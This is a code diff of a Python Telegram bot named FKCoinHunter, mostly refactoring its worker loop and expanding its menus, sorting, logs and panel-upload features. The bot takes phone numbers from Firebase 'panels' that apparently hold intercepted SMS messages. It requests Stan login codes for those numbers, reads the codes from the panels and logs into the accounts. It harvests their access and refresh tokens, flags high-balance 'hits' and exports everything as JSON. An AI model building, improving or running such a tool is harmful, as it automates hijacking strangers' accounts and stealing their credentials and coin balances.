-                    time.sleep(10)
-                    continue
+                    send_log("⚠️ No panels. Add one via /addpanel", 'warning')
+                    time.sleep(10); continue
 
                 panel = self.dm.get_current_panel()
                 if not panel or panel not in panels:
                     self.dm.set_current_db(0)
                     panel = self.dm.get_current_panel()
                     if not panel:
-                        time.sleep(5)
-                        continue
+                        time.sleep(5); continue
 
-                firebase_url = panel.get("url")
-                sender_keyword = panel.get("sender", "STAN")
+                fburi = panel.get("url")
+                sender = panel.get("sender", "STAN")
                 idx = self.dm.current_panel_index
                 total = len(panels)
                 name = panel.get('name', '?')
@@ -739,7 +762,7 @@ class AutomationWorker:
                 auto_status['current_panel'] = name
                 auto_status['panel_index'] = idx + 1
                 auto_status['total_panels'] = total
-                auto_status['database_url'] = firebase_url
+                auto_status['database_url'] = fburi
                 auto_status['current_action'] = f'Fetching {name}'
 
                 send_log(f"📡 Panel {idx+1}/{total}: {name}", 'info')
@@ -747,24 +770,19 @@ class AutomationWorker:
 
                 if not devices:
                     send_log(f"⚠️ No devices in {name}. Moving on…", 'warning')
-                    self._move_next_panel()
-                    time.sleep(2)
-                    continue
+                    self._move_next_panel(); time.sleep(2); continue
 
                 send_log(f"📋 {len(devices)} devices in {name}", 'info')
 
                 available = [(p, d) for p, d in devices if not self.am.is_processed(p)]
                 if not available:
-                    send_log(f"✅ All devices in {name} processed. Next panel.", 'success')
-                    self._move_next_panel()
-                    time.sleep(2)
-                    continue
+                    send_log(f"✅ All processed in {name}. Next.", 'success')
+                    self._move_next_panel(); time.sleep(2); continue
 
                 total_avail = len(available)
-                send_log(f"🆕 {total_avail} new devices in {name}", 'info')
+                send_log(f"🆕 {total_avail} new devices", 'info')
 
-                processed_total = 0
-                failed_total = 0
+                processed_total = failed_total = batch_num = 0
                 batch_num = 1
 
                 while processed_total < total_avail and self.running:
@@ -772,48 +790,44 @@ class AutomationWorker:
                     end = min(processed_total + MAX_WORKERS, total_avail)
                     batch = available[start:end]
 
-                    send_log(f"🚀 Batch {batch_num}: {len(batch)} devices (remaining {total_avail - processed_total})", 'info')
+                    auto_status['batch_info'] = f"Batch {batch_num} • {len(batch)} devices"
+                    send_log(
+                        f"🚀 Batch {batch_num}: {len(batch)} devices "
+                        f"(remaining {total_avail - processed_total})", 'info'
+                    )
 
                     futures = []
                     for phone, dev in batch:
                         if not self.running:
                             break
                         futures.append(self.executor.submit(
-                            self._process_device, phone, dev, firebase_url, sender_keyword
+                            self._process_device, phone, dev, fburi, sender
                         ))
-
                     auto_status['active_workers'] = len([f for f in futures if not f.done()])
 
-                    batch_ok = 0
-                    batch_fail = 0
-                    completed = 0
+                    batch_ok = batch_fail = completed = 0
                     for fut in as_completed(futures):
                         try:
                             ok = fut.result(timeout=120)
                             if ok:
-                                batch_ok += 1
-                                self.processed_count += 1
+                                batch_ok += 1; self.processed_count += 1
                                 self.failed_count = 0
                             else:
-                                batch_fail += 1
-                                self.failed_count += 1
+                                batch_fail += 1; self.failed_count += 1
                         except Exception as e:
-                            batch_fail += 1
-                            self.failed_count += 1
+                            batch_fail += 1; self.failed_count += 1
                             send_log(f"❌ Worker error: {e}", 'error')
-                        completed += 1
-                        processed_total += 1
+                        completed += 1; processed_total += 1
                         auto_status['active_workers'] = len([f for f in futures if not f.done()])
-                        if completed % 2 == 0 or completed == len(futures):
-                            send_log(f"📊 Batch {batch_num}: {completed}/{len(futures)} ({batch_ok}✅ {batch_fail}❌)", 'info')
 
                     batch_num += 1
                     failed_total += batch_fail
                     auto_status['active_workers'] = 0
+                    auto_status['batch_info'] = ''
                     send_log(f"📊 Batch {batch_num-1} done: {batch_ok}✅ {batch_fail}❌", 'info')
 
                     if self.failed_count >= 10:
-                        send_log(f"⚠️ 10 consecutive fails in {name}. Cycling panel.", 'warning')
+                        send_log(f"⚠️ 10 consecutive fails in {name}. Cycling.", 'warning')
                         break
 
                     if processed_total < total_avail:
@@ -829,13 +843,13 @@ class AutomationWorker:
 
             except Exception as e:
                 send_log(f"❌ Worker loop error: {e}", 'error')
-                self._move_next_panel()
-                time.sleep(5)
+                self._move_next_panel(); time.sleep(5)
 
         auto_status['current_action'] = 'Idle'
         auto_status['active_workers'] = 0
+        auto_status['batch_info'] = ''
 
-    def _process_device(self, phone: str, device_id: str, firebase_url: str, sender_keyword: str) -> bool:
+    def _process_device(self, phone, dev_id, fburi, sender):
         if self.am.is_processed(phone):
             return False
         self.am.mark_processed(phone)
@@ -843,86 +857,77 @@ class AutomationWorker:
         try:
             formatted = format_phone(phone)
             wid = threading.current_thread().name
-            send_log(f"[{wid}] 📱 {formatted}", 'info')
+            ua = "Mozilla/5.0 (Linux; Android 14; SM-A065F) AppleWebKit/537.36"
+            uuid = secrets.token_hex(8)
 
-            user_agent = "Mozilla/5.0 (Linux; Android 14; SM-A065F) AppleWebKit/537.36"
-            device_uuid = secrets.token_hex(8)
-
-            otp_resp = send_stan_otp(formatted, user_agent)
+            otp_resp = send_stan_otp(formatted, ua)
             if otp_resp.get("already_registered"):
-                send_log(f"[{wid}] ⚠️ {formatted} - already registered", 'warning')
+                send_log(f"[{wid}] ⚠️ {formatted} already registered", 'warning')
                 self.am.stats['already_registered'] += 1
                 self.am.mark_failed(phone, 'Already registered')
                 return False
             if not otp_resp.get("success"):
-                send_log(f"[{wid}] ❌ {formatted} - OTP request failed", 'error')
+                send_log(f"[{wid}] ❌ {formatted} OTP request failed", 'error')
                 self.am.mark_failed(phone, 'OTP request failed')
                 return False
 
-            send_log(f"[{wid}] ✅ OTP sent to {formatted}, polling Firebase…", 'success')
-            otp = poll_otp_from_panel(firebase_url, device_id, sender_keyword, OTP_WAIT_SECONDS)
+            send_log(f"[{wid}] ✅ OTP sent to {formatted}", 'success')
+            otp = poll_otp_from_panel(fburi, dev_id, sender, OTP_WAIT_SECONDS)
             if not otp:
-                send_log(f"[{wid}] ⏰ {formatted} - no OTP received", 'warning')
+                send_log(f"[{wid}] ⏰ {formatted} no OTP", 'warning')
                 self.am.mark_no_otp(phone)
                 self.am.mark_failed(phone, 'No OTP')
                 return False
-            send_log(f"[{wid}] 🔑 OTP: {otp} for {formatted}", 'success')
+            send_log(f"[{wid}] 🔑 {formatted} OTP: {otp}", 'success')
 
-            v_resp = verify_stan_otp(formatted, otp, user_agent, device_uuid)
-            if not v_resp.get('success'):
-                err = v_resp.get('error', 'verify failed')
+            v = verify_stan_otp(formatted, otp, ua, uuid)
+            if not v.get('success'):
+                err = v.get('error', 'verify failed')
                 send_log(f"[{wid}] ❌ {formatted}: {err}", 'error')
                 if "400" in err:
                     self.am.stats['http_400_errors'] += 1
                 self.am.mark_failed(phone, 'Verify failed')
                 return False
 
-            access_token = v_resp['access_token']
-            refresh_token = v_resp.get('refresh_token', '')
-            firebase_token = v_resp.get('firebase_token', '')
-            user_data = v_resp.get('user_data', {})
-            username = user_data.get('username', 'User')
-            user_id = user_data.get('id', 0)
+            tok = v['access_token']
+            rtok = v.get('refresh_token', '')
+            ftok = v.get('firebase_token', '')
+            ud = v.get('user_data', {})
+            uname = ud.get('username', 'User')
+            uid = ud.get('id', 0)
 
-            balance = get_stan_balance(access_token, user_agent)
-            messages = fetch_messages_for_device(firebase_url, device_id)
+            balance = get_stan_balance(tok, ua)
+            messages = fetch_messages_for_device(fburi, dev_id)
 
-            account = Account(
-                phone=formatted,
-                access_token=access_token,
-                refresh_token=refresh_token,
-                firebase_token=firebase_token,
-                user_id=user_id,
-                username=username,
-                fk_balance=balance,
-                device_uid=device_uuid,
-                user_agent=user_agent,
+            acc = Account(
+                phone=formatted, access_token=tok,
+                refresh_token=rtok, firebase_token=ftok,
+                user_id=uid, username=uname, fk_balance=balance,
+                device_uid=uuid, user_agent=ua,
                 created_at=datetime.now().isoformat(),
                 saved=(balance >= MIN_FK_BALANCE),
-                device_id=device_id,
-                firebase_url=firebase_url
+                device_id=dev_id, firebase_url=fburi
             )
-            self.am.add_account(account, messages, firebase_url, device_id)
+            self.am.add_account(acc, messages, fburi, dev_id)
             auto_status['successful'] = self.am.stats['successful']
             auto_status['total_balance'] = self.am.stats['total_balance']
             auto_status['hits'] = self.am.stats['hits']
 
             is_hit = balance >= HIT_THRESHOLD
             if is_hit:
-                send_log(f"[{wid}] ⭐ HIT {formatted} | {balance} FK | {username}", 'hit')
+                send_log(f"[{wid}] ⭐ HIT {formatted} | {balance} FK | {uname}", 'hit')
                 auto_status['recent_hits'].append({
                     'phone': formatted, 'balance': balance,
-                    'username': username,
+                    'username': uname,
                     'time': datetime.now().strftime('%H:%M:%S')
                 })
                 auto_status['recent_hits'] = auto_status['recent_hits'][-10:]
             else:
-                send_log(f"[{wid}] ✅ {formatted} | {balance} FK | {username}", 'success')
+                send_log(f"[{wid}] ✅ {formatted} | {balance} FK | {uname}", 'success')
 
             auto_status['recent_accounts'].append({
-                'phone': formatted, 'balance': balance,
-                'username': username, 'is_hit': is_hit,
-                'time': datetime.now().strftime('%H:%M:%S')
+                'phone': formatted, 'balance': balance, 'username': uname,
+                'is_hit': is_hit, 'time': datetime.now().strftime('%H:%M:%S')
             })
             auto_status['recent_accounts'] = auto_status['recent_accounts'][-20:]
             return True
@@ -939,65 +944,112 @@ dm = DatabaseManager()
 worker = AutomationWorker(am, dm)
 
 
-# ============ TELEGRAM UI ============
+# ============ UI BUILDERS ============
 def main_menu_kb():
     running = auto_status['running']
-    start_btn = InlineKeyboardButton("⏹ Stop" if running else "▶️ Start",
-                                     callback_data="stop_auto" if running else "start_auto")
+    toggle = ("⏹ Stop Automation" if running else "▶️ Start Automation")
+    toggle_cb = "stop_auto" if running else "start_auto"
     return InlineKeyboardMarkup([
-        [start_btn, InlineKeyboardButton("📊 Status", callback_data="status")],
-        [InlineKeyboardButton("📡 Panels", callback_data="panels_menu"),
-         InlineKeyboardButton("⭐ Hits", callback_data="hits_menu")],
-        [InlineKeyboardButton("👤 Accounts", callback_data="accounts_menu"),
-         InlineKeyboardButton("📜 Logs", callback_data="logs_menu")],
-        [InlineKeyboardButton("📤 Export", callback_data="export_menu")],
+        [InlineKeyboardButton(toggle, callback_data=toggle_cb)],
+        [
+            InlineKeyboardButton("📊 Status", callback_data="status"),
+            InlineKeyboardButton("📜 Logs", callback_data="logs_menu"),
+        ],
+        [
+            InlineKeyboardButton("📡 Panels", callback_data="panels_menu"),
+            InlineKeyboardButton("⭐ Hits", callback_data="hits_menu"),
+        ],
+        [
+            InlineKeyboardButton("👤 Accounts", callback_data="accounts_menu"),
+            InlineKeyboardButton("📤 Export", callback_data="export_menu"),
+        ],
+        [InlineKeyboardButton("❓ Help", callback_data="help_menu")],
     ])
 
 
 def status_text() -> str:
     s = auto_status
     st = am.get_stats()
-    running_icon = "🟢" if s['running'] else "🔴"
+    icon = "🟢" if s['running'] else "🔴"
+    state = "Running" if s['running'] else "Idle"
+
+    processed = st['total_processed'] or 1
+    success_pct = (st['successful'] / processed) * 100
+    fail_pct = (st['failed'] / processed) * 100
+    worker_pct = (s['active_workers'] / MAX_WORKERS) * 100
+
+    panels_total = s.get('total_panels', 0)
+    panels_idx = s.get('panel_index', 0)
+    panel_line = f"{panels_idx}/{panels_total}" if panels_total else "0/0"
+
+    recent_hits = ""
+    if s.get('recent_hits'):
+        recent_hits = "\n\n🔥 <b>Recent Hits</b>\n" + "\n".join(
+            f"• <code>{h['phone']}</code> — <b>{h['balance']} FK</b> "
+            f"<i>({h['time']})</i>"
+            for h in s['recent_hits'][-3:]
+        )
+
     return (
-        f"{running_icon} <b>FKCoinHunter Status</b>\n"
-        f"────────────────────\n"
-        f"📡 Panel: <b>{s.get('current_panel', '—')}</b> "
-        f"({s.get('panel_index', 0)}/{s.get('total_panels', 0)})\n"
-        f"⚙️ Action: {s.get('current_action', 'Idle')}\n"
-        f"👷 Active Workers: <b>{s.get('active_workers', 0)}/{MAX_WORKERS}</b>\n"
-        f"────────────────────\n"
-        f"📊 <b>Stats</b>\n"
-        f"• Processed: <b>{st['total_processed']}</b>\n"
-        f"• ✅ Success: <b>{st['successful']}</b>\n"
-        f"• ❌ Failed: <b>{st['failed']}</b>\n"
-        f"• ⏰ No OTP: <b>{st['no_otp']}</b>\n"
-        f"• ⚠️ Already reg: <b>{st['already_registered']}</b>\n"
-        f"• ⭐ Hits: <b>{st['hits']}</b>\n"
-        f"• 💰 Total Balance: <b>{st['total_balance']} FK</b>\n"
-        f"────────────────────\n"
-        f"🎯 Hit threshold: <b>{HIT_THRESHOLD} FK</b>\n"
-        f"💾 Saved threshold: <b>{MIN_FK_BALANCE} FK</b>"
+        f"{icon} <b>FKCoinHunter</b> • <b>{state}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"📡 <b>Panel {panel_line}</b> — {s.get('current_panel') or '—'}\n"
+        f"⚙️ <b>Action:</b> {s.get('current_action', 'Idle')}\n"
+        f"📦 <b>Batch:</b> {s.get('batch_info') or '—'}\n"
+        f"👷 <b>Workers:</b> {s.get('active_workers', 0)}/{MAX_WORKERS} "
+        f"{progress_bar(worker_pct)}\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"📊 <b>Session Stats</b>\n"
+        f"├ 📥 Processed: <b>{fmt_num(st['total_processed'])}</b>\n"
+        f"├ ✅ Success: <b>{fmt_num(st['successful'])}</b> ({success_pct:.0f}%)\n"
+        f"├ ❌ Failed: <b>{fmt_num(st['failed'])}</b> ({fail_pct:.0f}%)\n"
+        f"├ ⏰ No OTP: <b>{fmt_num(st['no_otp'])}</b>\n"
+        f"├ ⚠️ Already: <b>{fmt_num(st['already_registered'])}</b>\n"
+        f"└ 💰 Total: <b>{fmt_num(st['total_balance'])} FK</b>\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"⭐ <b>Hits:</b> {fmt_num(st['hits'])} (≥ {HIT_THRESHOLD} FK)\n"
+        f"💾 <b>Saved:</b> {fmt_num(st['saved_accounts'])} (≥ {MIN_FK_BALANCE} FK)\n"
+        f"🕒 <i>Updated {s.get('last_update','')[11:19]}</i>"
+        f"{recent_hits}"
     )
 
 
 def panels_kb():
     kb = []
-    for i, p in enumerate(dm.get_panels()):
-        marker = "🟢" if i == dm.current_panel_index else "⚪"
+    panels = dm.get_panels()
+    for i, p in enumerate(panels):
+        active = i == dm.current_panel_index
+        marker = "🟢" if active else "⚪"
         kb.append([
             InlineKeyboardButton(f"{marker} {i+1}. {p.get('name','?')}",
                                  callback_data=f"panel_view_{i}"),
-            InlineKeyboardButton("🗑", callback_data=f"panel_del_{i}")
+            InlineKeyboardButton("🗑", callback_data=f"panel_del_confirm_{i}")
         ])
-    kb.append([InlineKeyboardButton("➕ Add Panel", callback_data="panel_add")])
-    kb.append([InlineKeyboardButton("⏭ Next Panel", callback_data="panel_next"),
-               InlineKeyboardButton("🔍 Fetch Devices", callback_data="panel_fetch")])
+    if not panels:
+        kb.append([InlineKeyboardButton("➕ Add your first panel",
+                                        callback_data="panel_add")])
+    else:
+        kb.append([
+            InlineKeyboardButton("➕ Add Panel", callback_data="panel_add"),
+            InlineKeyboardButton("⏭ Next", callback_data="panel_next"),
+        ])
+        kb.append([
+            InlineKeyboardButton("🔍 Fetch Devices", callback_data="panel_fetch"),
+            InlineKeyboardButton("🗑 Clear All", callback_data="panel_clear_all"),
+        ])
     kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu")])
     return InlineKeyboardMarkup(kb)
 
 
-def hits_kb(page: int = 0, per_page: int = 8):
+def hits_kb(page=0, per_page=8, sort='date'):
     hits = am.hit_manager.get_hits()
+    if sort == 'balance':
+        hits.sort(key=lambda h: h.get('fk_balance', 0), reverse=True)
+    elif sort == 'phone':
+        hits.sort(key=lambda h: h.get('phone', ''))
+    else:
+        hits.sort(key=lambda h: h.get('created_at', ''), reverse=True)
+
     total = len(hits)
     start = page * per_page
     end = min(start + per_page, total)
@@ -1005,40 +1057,113 @@ def hits_kb(page: int = 0, per_page: int = 8):
     for i in range(start, end):
         h = hits[i]
         kb.append([InlineKeyboardButton(
-            f"⭐ {h['phone']} | {h['fk_balance']} FK",
-            callback_data=f"hit_view_{i}"
+            f"⭐ {h['phone']} • {h['fk_balance']} FK",
+            callback_data=f"hit_view_{i}_{sort}"
         )])
+
     nav = []
     if page > 0:
-        nav.append(InlineKeyboardButton("⬅️", callback_data=f"hits_page_{page-1}"))
+        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"hits_page_{page-1}_{sort}"))
     if end < total:
-        nav.append(InlineKeyboardButton("➡️", callback_data=f"hits_page_{page+1}"))
+        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"hits_page_{page+1}_{sort}"))
     if nav:
         kb.append(nav)
-    kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu")])
-    return InlineKeyboardMarkup(kb), total, page, per_page
+
+    sorts = []
+    for lbl, key in [("📅 Date", "date"), ("💰 Balance", "balance"), ("📱 Phone", "phone")]:
+        if key == sort:
+            sorts.append(InlineKeyboardButton(f"• {lbl} •", callback_data=f"hits_page_0_{key}"))
+        else:
+            sorts.append(InlineKeyboardButton(lbl, callback_data=f"hits_page_0_{key}"))
+    kb.append(sorts)
+    kb.append([InlineKeyboardButton("📤 Export Hits", callback_data="export_hits"),
+               InlineKeyboardButton("🔙 Back", callback_data="menu")])
+    return InlineKeyboardMarkup(kb), total, page, per_page, sort, hits
 
 
-def accounts_kb(page: int = 0, per_page: int = 5):
+def accounts_kb(page=0, per_page=8):
     accs = am.get_accounts()
+    accs.sort(key=lambda a: a.get('fk_balance', 0), reverse=True)
     total = len(accs)
     start = page * per_page
     end = min(start + per_page, total)
-    text_lines = []
+    lines = []
     for a in accs[start:end]:
-        text_lines.append(
-            f"👤 <code>{a['phone']}</code> — <b>{a['fk_balance']} FK</b>"
+        tag = "⭐" if a['fk_balance'] >= HIT_THRESHOLD else "•"
+        lines.append(
+            f"{tag} <code>{a['phone']}</code> — <b>{a['fk_balance']} FK</b>"
         )
     kb = []
     nav = []
     if page > 0:
-        nav.append(InlineKeyboardButton("⬅️", callback_data=f"acc_page_{page-1}"))
+        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"acc_page_{page-1}"))
     if end < total:
-        nav.append(InlineKeyboardButton("➡️", callback_data=f"acc_page_{page+1}"))
+        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"acc_page_{page+1}"))
     if nav:
         kb.append(nav)
-    kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu")])
-    return InlineKeyboardMarkup(kb), text_lines, total, page, per_page
+    kb.append([InlineKeyboardButton("📤 Export Accounts", callback_data="export_acc"),
+               InlineKeyboardButton("🔙 Back", callback_data="menu")])
+    return InlineKeyboardMarkup(kb), lines, total, page, per_page
+
+
+def logs_kb(filter_type='all'):
+    types = [
+        ("All", "all", "📜"), ("Errors", "error", "❌"),
+        ("Hits", "hit", "⭐"), ("Success", "success", "✅")
+    ]
+    row = []
+    for lbl, key, icon in types:
+        prefix = "• " if key == filter_type else ""
+        suffix = " •" if key == filter_type else ""
+        row.append(InlineKeyboardButton(
+            f"{prefix}{icon} {lbl}{suffix}",
+            callback_data=f"logs_filter_{key}"
+        ))
+    return InlineKeyboardMarkup([
+        row,
+        [InlineKeyboardButton("🔄 Refresh", callback_data=f"logs_filter_{filter_type}"),
+         InlineKeyboardButton("🗑 Clear", callback_data="logs_clear")],
+        [InlineKeyboardButton("🔙 Back", callback_data="menu")]
+    ])
+
+
+def panel_add_source_kb():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("✍️ Paste URL(s)", callback_data="panel_add_text")],
+        [InlineKeyboardButton("📁 Upload .txt File", callback_data="panel_add_file")],
+        [InlineKeyboardButton("📁 Upload .json File", callback_data="panel_add_file")],
+        [InlineKeyboardButton("🔙 Cancel", callback_data="panels_menu")],
+    ])
+
+
+def help_text():
+    return (
+        "❓ <b>FKCoinHunter Help</b>\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        "<b>Commands</b>\n"
+        "/start — Main menu\n"
+        "/status — Live status\n"
+        "/addpanel — Add panels (paste or upload)\n"
+        "/panels — Manage panels\n"
+        "/hits — View hits\n"
+        "/accounts — View accounts\n"
+        "/logs — Recent logs\n"
+        "/start_auto — Start\n"
+        "/stop_auto — Stop\n"
+        "/export_accounts — Download accounts JSON\n"
+        "/export_hits — Download hits JSON\n\n"
+        "<b>Panel import formats</b>\n"
+        "• Plain Firebase URL<br/>"
+        "<code>https://xxx.firebaseio.com/</code>\n"
+        "• Encoded URL\n"
+        "<code>https://...?s=base64encoded</code>\n"
+        "• .txt file — one URL per line (# for comments)\n"
+        "• .json file — array of URLs or {'urls': [...]}\n\n"
+        "<b>Thresholds</b>\n"
+        f"• Saved ≥ <b>{MIN_FK_BALANCE} FK</b>\n"
+        f"• Hit ≥ <b>{HIT_THRESHOLD} FK</b>\n"
+        f"• Workers: <b>{MAX_WORKERS}</b> concurrent"
+    )
 
 
 # ============ HANDLERS ============
@@ -1051,10 +1176,12 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     admin_chat_id = chat_id
     await update.message.reply_text(
         "🦅 <b>FKCoinHunter Bot</b>\n\n"
-        f"Workers: <b>{MAX_WORKERS}</b> concurrent\n"
-        f"Hit threshold: <b>{HIT_THRESHOLD} FK</b>\n"
-        f"Panels loaded: <b>{len(dm.get_panels())}</b>\n"
-        f"Hits saved: <b>{len(am.hit_manager.hits)}</b>",
+        f"⚙️ Workers: <b>{MAX_WORKERS}</b> concurrent\n"
+        f"🎯 Hit threshold: <b>{HIT_THRESHOLD} FK</b>\n"
+        f"💾 Saved threshold: <b>{MIN_FK_BALANCE} FK</b>\n"
+        f"📡 Panels: <b>{len(dm.get_panels())}</b>\n"
+        f"⭐ Hits: <b>{len(am.hit_manager.hits)}</b>\n\n"
+        "Use the menu below to control everything.",
         parse_mode=ParseMode.HTML,
         reply_markup=main_menu_kb()
     )
@@ -1062,19 +1189,10 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "<b>Commands</b>\n"
-        "/start - Main menu\n"
-        "/status - Current status\n"
-        "/addpanel &lt;url&gt; - Add Firebase panel\n"
-        "/panels - Panel management\n"
-        "/hits - View hits\n"
-        "/accounts - View accounts\n"
-        "/logs - Recent logs\n"
-        "/export_accounts - Download accounts JSON\n"
-        "/export_hits - Download hits JSON\n"
-        "/start_auto - Start automation\n"
-        "/stop_auto - Stop automation",
-        parse_mode=ParseMode.HTML
+        help_text(), parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("🏠 Menu", callback_data="menu")
+        ]])
     )
 
 
@@ -1085,33 +1203,50 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 
 async def cmd_addpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if not ctx.args:
-        ctx.user_data['awaiting'] = 'addpanel'
+    if ctx.args:
+        urls = " ".join(ctx.args).replace(",", " ").split()
+        urls = [u for u in urls if u.strip()]
+        added, failed = dm.add_databases(urls)
         await update.message.reply_text(
-            "Send the Firebase panel URL(s) — one per line, or comma-separated.\n"
-            "Accepted formats: <code>https://xxx.firebaseio.com/</code> or "
-            "<code>https://...?s=base64</code>",
-            parse_mode=ParseMode.HTML
+            f"✅ Added <b>{added}</b> panel(s)."
+            + (f"\n⚠️ Skipped/failed: <b>{failed}</b>" if failed else "")
+            + f"\n\n📡 Total panels: <b>{len(dm.get_panels())}</b>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("📡 View Panels", callback_data="panels_menu")
+            ]])
         )
         return
-    urls = " ".join(ctx.args).split(",")
-    n = dm.add_databases([u.strip() for u in urls if u.strip()])
-    await update.message.reply_text(f"✅ Added <b>{n}</b> panel(s).",
-                                    parse_mode=ParseMode.HTML)
+    await update.message.reply_text(
+        "📥 <b>Add Panels</b>\n\n"
+        "Choose how you'd like to add panels:",
+        parse_mode=ParseMode.HTML,
+        reply_markup=panel_add_source_kb()
+    )
 
 
 async def cmd_panels(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        f"📡 <b>Panels</b> ({len(dm.get_panels())})",
+        f"📡 <b>Panel Manager</b>\n"
+        f"Total: <b>{len(dm.get_panels())}</b> • "
+        f"Active: <b>#{dm.current_panel_index + 1 if dm.get_panels() else 0}</b>\n\n"
+        "Tap a panel to make it active.",
         parse_mode=ParseMode.HTML,
         reply_markup=panels_kb()
     )
 
 
 async def cmd_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    kb, total, page, _ = hits_kb(0)
+    kb, total, page, _, sort, _ = hits_kb(0)
     if total == 0:
-        await update.message.reply_text("⭐ No hits yet.", reply_markup=kb)
+        await update.message.reply_text(
+            "⭐ <b>No hits yet</b>\n\n"
+            f"Hits are accounts with balance ≥ <b>{HIT_THRESHOLD} FK</b>.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("🏠 Menu", callback_data="menu")
+            ]])
+        )
         return
     await update.message.reply_text(
         f"⭐ <b>Hits</b> — {total} total",
@@ -1121,31 +1256,46 @@ async def cmd_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     kb, lines, total, page, _ = accounts_kb(0)
-    header = f"👤 <b>Accounts</b> — {total} total (page {page+1})"
+    header = f"👤 <b>Accounts</b> — {total} total"
+    body = "\n\n" + ("\n".join(lines) if lines else "<i>No accounts yet.</i>")
     await update.message.reply_text(
-        header + "\n\n" + ("\n".join(lines) if lines else "No accounts."),
+        header + body,
         parse_mode=ParseMode.HTML, reply_markup=kb
     )
 
 
 async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     logs = auto_status['processing_logs'][-30:]
-    if not logs:
-        await update.message.reply_text("📜 No logs yet.")
-        return
-    text = "📜 <b>Last 30 logs</b>\n" + "\n".join(
-        f"<code>{l['timestamp']}</code> [{l['type']}] {l['message']}"
-        for l in logs
+    body = "📜 <b>Logs</b> (all)\n\n" + (
+        "\n".join(f"<code>{l['timestamp']}</code> [{l['type'][:4]}] {l['message'][:90]}"
+                  for l in logs) if logs else "<i>No logs yet.</i>"
     )
-    if len(text) > 4000:
-        text = text[-4000:]
+    if len(body) > 3800:
+        body = body[-3800:]
     await update.message.reply_text(
-        text, parse_mode=ParseMode.HTML,
-        reply_markup=InlineKeyboardMarkup([[
-            InlineKeyboardButton("🔄 Refresh", callback_data="logs_menu"),
-            InlineKeyboardButton("🔙 Back", callback_data="menu")
-        ]])
+        body, parse_mode=ParseMode.HTML, reply_markup=logs_kb('all')
     )
+
+
+async def cmd_start_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if not dm.get_current_panel():
+        await update.message.reply_text(
+            "⚠️ No panel selected. Use /addpanel first.",
+            reply_markup=main_menu_kb()
+        )
+        return
+    if worker.start():
+        await update.message.reply_text(
+            "🚀 Automation started.",
+            reply_markup=main_menu_kb()
+        )
+    else:
+        await update.message.reply_text("Already running.")
+
+
+async def cmd_stop_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    worker.stop()
+    await update.message.reply_text("⏹ Stopped.", reply_markup=main_menu_kb())
 
 
 async def cmd_export_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -1155,7 +1305,8 @@ async def cmd_export_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     path = os.path.join(DATA_DIR, f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
     with open(path, 'w', encoding='utf-8') as f:
         json.dump([a.to_dict() for a in am.accounts], f, indent=2, ensure_ascii=False)
-    await update.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
+    await update.message.reply_document(document=InputFile(path),
+                                        filename=os.path.basename(path))
     os.remove(path)
 
 
@@ -1167,104 +1318,253 @@ async def cmd_export_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     path = os.path.join(DATA_DIR, f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
     with open(path, 'w', encoding='utf-8') as f:
         json.dump(hits, f, indent=2, ensure_ascii=False)
-    await update.message.reply_document(document=InputFile(path), filename=os.path.basename(path))
+    await update.message.reply_document(document=InputFile(path),
+                                        filename=os.path.basename(path))
     os.remove(path)
 
 
-async def cmd_start_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if not dm.get_current_panel():
-        await update.message.reply_text("⚠️ No panel selected. Add one with /addpanel.")
+# ============ FILE UPLOAD (NEW) ============
+async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    doc = update.message.document
+    if not doc:
         return
-    if worker.start():
-        await update.message.reply_text("🚀 Automation started.", reply_markup=main_menu_kb())
+    filename = (doc.file_name or "").lower()
+    if not (filename.endswith('.txt') or filename.endswith('.json')):
+        await update.message.reply_text(
+            "⚠️ Only <b>.txt</b> or <b>.json</b> files are accepted.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    file = await doc.get_file()
+    content = await file.download_as_bytearray()
+    try:
+        text = content.decode('utf-8', errors='ignore')
+    except Exception:
+        await update.message.reply_text("❌ Could not read file.")
+        return
+
+    if filename.endswith('.json'):
+        urls = parse_urls_from_json(text)
     else:
-        await update.message.reply_text("Already running.")
+        urls = parse_urls_from_text(text)
+
+    if not urls:
+        await update.message.reply_text(
+            "⚠️ No valid panel URLs found.\n\n"
+            "<b>Accepted formats:</b>\n"
+            "• Plain Firebase URL\n"
+            "• URL with <code>?s=</code> parameter\n"
